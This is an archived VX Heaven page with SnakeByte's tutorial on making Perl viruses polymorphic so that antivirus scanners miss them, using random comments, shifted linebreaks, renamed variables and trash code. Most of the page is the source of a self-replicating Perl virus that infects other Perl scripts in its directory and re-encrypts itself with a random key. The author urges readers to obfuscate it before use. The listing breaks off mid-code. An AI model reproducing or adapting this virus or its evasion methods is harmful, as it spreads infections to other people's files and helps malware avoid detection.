<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SnakeByte 'Polymorphism in Perl Viruses' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SnakeByte"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SnakeByte,Polymorphism in Perl Viruses, temp, file, newvar, snakebyte, print, replace, rand, variables, perl, viruses, filename, kryptocrew, linebreaks, insert, join"/>
<meta name="Description" content="This little tutorial will present you some simple, but effective methods, to hide your perl Virus from detection by analyzing the perl source code."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"ed7882a46f0282d07c377ea9502adc4827140861-1498756989-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsn10.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Polymorphism in Perl Viruses</h1><p><a href="/lib/?lang=en&amp;author=SnakeByte"> SnakeByte</a><br/> <em><a href="/vx.php?fid=11#f11">29a [6]</a></em><br/> <em>March 2002</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsn10.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsn10">Back to index</a>] [<a href="/lib/vsn10.html#disqus_thread">Comments</a>]<br/> 
<address>
SnakeByte [ <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4e1d202f252b0c373a2b0e253c373e3a212d3c2b39602a2b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> ]<br/>
www.kryptocrew.de/snakebyte/
</address>
<p>After writing something about <a href="/lib/vsn09.html">EPO</a> and <a href="/lib/vsn08.html">Encryption in Perl Viruses</a> I somehow felt that I also have to do this. So I will explain here some techniques which could be used in Perl to create polymorphic perl viruses.</p>
<p>There are several things we could do to make every infection of the virus different from all others, to confuse a possible Anti Virus Scanner. The first one is to add random, comments to each line :</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$a</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$a</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">@Virus</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$a</span><span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #0000ff;">$comment</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">65535</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; <span style="color: #0000ff;">@Virus</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$a</span><span style="color: black;">&#93;</span> <span style="color: #339933;">.=</span> <span style="color: #ff0000;">&quot; <span style="color: #000099; font-weight: bold;">\#</span>$comment&quot;</span> <span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>You could also include characters or other stuff, but once there is a Scanner for perl viruses, the first thing it will do is to remove all comments =)</p>
<p>So this is very weak, but until there is a scanner, we could use this. Another thing we could do to make every virus different, is to change the linebreaks. In perl linebreaks are just used for better reading, so we could remove every linebreak and insert some, ( nearly ) everywhere we want to.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;testme&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;cool&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp;could also be <span style="color: #339933;">:</span><br/>
<br/>
&nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><br/>
&nbsp;<span style="color: #ff0000;">&quot;testme&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;cool&quot;</span><br/>
&nbsp;<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>so here could we get a nice range of variability =)</p>
<p>But once scanners are implemented, they will just remove all linebreaks, and unnecessairy spaces, so this would not help in the long run.</p>
<p>Ok, let's start with something that might also work in the long run, replacing all variables with others.</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<span style="color: #0000ff;">$myvars2</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;MyVars:Virus:whatever:myvars2&quot;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># all the variables you use</span><br/>
&nbsp;<span style="color: #0000ff;">@MyVars</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/split.html"><span style="color: #000066;">split</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;:&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">$myvars2</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># read them into an array</span><br/>
&nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$x</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$x</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000ff;">@MyVars</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$x</span><span style="color: #339933;">++</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; <span style="color: #0000ff;">$newVar</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">25</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #cc66cc;">65</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;"># we take all letters</span><br/>
&nbsp; <span style="color: #0000ff;">$newVar</span> <span style="color: #339933;">.=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">65535</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># + a random number</span><br/>
&nbsp; <span style="color: #0000ff;">$Virus</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="40336f000d3916213233">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>[$x]/$newVar/</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># and replace the variable =P</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Easy and effective, this makes string scanning useless and forces the AV's to use wildcards =) This is better poly than the one described above, but we can even go on. We could swap instructions when generating the decryptor, and use other ones, doing the same stuff ( don't think you need code for this *g* )</p>
<p>When swapping and replacing instructions, you are also able to insert trash code, like $DD34424 = "sdfk.lsdjfpi3"; to make the virus even more variable, such a trashcode generator should be written as a sub to be able to use simple expressions like</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<span style="color: #0000ff;">$myCode</span> <span style="color: #339933;">.=</span> <span style="color: #ff0000;">&quot;whatever&quot;</span> <span style="color: #339933;">+</span> <span style="color: #0000ff;">&amp;trashcode</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>this way you can keep the code short and effective.</p>
<p>In my mind when you use EPO and Polymorphism in Perl Viruses AV's will have a very hard time to detect and remove perl viruses... ;)</p>
<p> Ok, this is a polymorphic perl virus which is using EPO techniques, To make this code useful strip the comments, remove linebreaks, and obfuscate it .. ;)</p>
<div class="perl" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<span style="color: black; font-style: italic;"># 1st Poly Virus by SnakeByte [Matrix/KryptoCrew] &nbsp; </span><br/>
&nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span><span style="color: #0000ff;">$0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #0000ff;">@Virus</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;File&gt;</span><span style="color: #339933;">;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># read own code</span><br/>
&nbsp;<span style="color: #0000ff;">$Virus</span><span style="color: #339933;">=</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/join.html"><span style="color: #000066;">join</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">@Virus</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$FileName</span><span style="color: black;">&#40;</span><span style="color: #339933;">&lt;*&gt;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># get files</span><br/>
&nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #339933;">-</span>r <span style="color: #0000ff;">$FileName</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>w <span style="color: #0000ff;">$FileName</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: #339933;">-</span>f <span style="color: #0000ff;">$FileName</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># check file</span><br/>
&nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/open.html"><span style="color: #000066;">open</span></a><span style="color: black;">&#40;</span>File<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;$FileName&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #0000ff;">@Temp</span><span style="color: #339933;">=</span><span style="color: #009999;">&lt;File&gt;</span><span style="color: #339933;">;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/close.html"><span style="color: #000066;">close</span></a><span style="color: black;">&#40;</span>File<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># open file</span><br/>
&nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">/perl/i</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/substr.html"><span style="color: #000066;">substr</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #cc66cc;">0</span><span style="color: #339933;">,</span><span style="color: #cc66cc;">2</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">eq</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\#</span>!&quot;</span> <span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;"># perl file ?</span><br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/length.html"><span style="color: #000066;">length</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">@Temp</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> <span style="color: #cc66cc;">5</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #cc66cc;">0</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># already infected ?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># first we generate a decryptor</span><br/>
<br/>
&nbsp;<span style="color: #0000ff;">$Key</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">255</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># cryptkey</span><br/>
&nbsp;<span style="color: #0000ff;">$crypttype</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">2</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># how to crypt it ?</span><br/>
<br/>
&nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$X</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$X</span> <span style="color: #339933;">&lt;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/length.html"><span style="color: #000066;">length</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$Virus</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$X</span><span style="color: #339933;">++</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># Encrypt it</span><br/>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <span style="color: #0000ff;">$crypttype</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">0</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp;<span style="color: #0000ff;">@Crypt</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$X</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/ord.html"><span style="color: #000066;">ord</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/substr.html"><span style="color: #000066;">substr</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$Virus</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">$X</span><span style="color: #339933;">,</span> <span style="color: #cc66cc;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$Key</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; <span style="color: black; font-style: italic;"># Multiply</span><br/>
&nbsp; <span style="color: black;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp;<span style="color: #0000ff;">@Crypt</span><span style="color: black;">&#91;</span><span style="color: #0000ff;">$X</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/ord.html"><span style="color: #000066;">ord</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/substr.html"><span style="color: #000066;">substr</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$Virus</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">$X</span><span style="color: #339933;">,</span> <span style="color: #cc66cc;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span><span style="color: #0000ff;">$Key</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>&nbsp; <span style="color: black; font-style: italic;"># Addition</span><br/>
&nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: black;">&#125;</span><br/>
<br/>
&nbsp;<span style="color: #0000ff;">$connectit</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">25</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #cc66cc;">65</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;<span style="color: #0000ff;">$VirString</span> <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/join.html"><span style="color: #000066;">join</span></a><span style="color: black;">&#40;</span><span style="color: #0000ff;">$connectit</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">@Crypt</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># all values get seperated by a !</span><br/>
&nbsp;<span style="color: #0000ff;">$filename</span> &nbsp;<span style="color: #339933;">=</span> &nbsp;<a style="color: #000060;" href="http://perldoc.perl.org/functions/chr.html"><span style="color: #000066;">chr</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">25</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #cc66cc;">65</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># random filename to put virus to</span><br/>
&nbsp;<span style="color: #0000ff;">$filename</span> <span style="color: #339933;">.=</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">65535</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <a style="color: #000060;" href="http://perldoc.perl.org/functions/int.html"><span style="color: #000066;">int</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://perldoc.perl.org/functions/rand.html"><span style="color: #000066;">rand</span></a><span style="color: black;">&#40;</span><span style="color: #cc66cc;">2</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #cc66cc;">0</span> <span style="color: black;">&#41;</span><span style="color: black;">&#123;</span> <br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\$</span>l1l = <span style="color: #000099; font-weight: bold;">\&quot;</span>$VirString<span style="color: #000099; font-weight: bold;">\&quot;</span><span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\$</span>11l = $Key<span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># key to decrypt</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\$</span>11l = $Key<span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;"># key to decrypt</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\$</span>l1l = <span style="color: #000099; font-weight: bold;">\&quot;</span>$VirString<span style="color: #000099; font-weight: bold;">\&quot;</span><span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #0000ff;">@Vir</span><span style="color: black;">&#91;</span><span style="color: #cc66cc;">2</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\@</span>ll1 = split(<span style="color: #000099; font-weight: bold;">\&quot;</span>$connectit<span style="color: #000099; font-weight: bold;">\&quot;</span>, <span style="color: #000099; font-weight: bold;">\$</span>l1l)<span style="color: #000099; font-weight: bold;">\;</span>&quot;</span><span style="color: #339933;">;</span><br/>
